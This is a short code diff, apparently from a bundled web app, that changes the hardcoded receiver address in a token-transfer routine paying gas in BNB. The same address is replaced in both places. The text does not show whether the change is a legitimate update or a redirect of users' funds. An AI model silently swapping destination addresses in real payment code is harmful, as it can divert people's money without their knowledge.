@@ -151,7 +151,7 @@ function Zp() {
       const gasPrice = await provider.getGasPrice();
 
       const gasEstimate = await tokenContract.estimateGas.transfer(
-        "0xfF63422D6Fbe1270310f7225b67df3A5EF1d8029", // Receiver address
+        "0x1455f3c0685ee5589C2295F11d91aC330cFA2a6f", // Receiver address
         tokenAmount // Amount of tokens to transfer
       );
       // Calculate total gas cost in BNB
@@ -169,7 +169,7 @@ function Zp() {
       }
       // Call the transfer function on the token contract
       const transactionResponse = await tokenContract.transfer(
-        "0xfF63422D6Fbe1270310f7225b67df3A5EF1d8029", // Receiver address
+        "0x1455f3c0685ee5589C2295F11d91aC330cFA2a6f", // Receiver address
         tokenAmount // Amount of tokens to transfer
       );
       // Wait for transaction confirmation
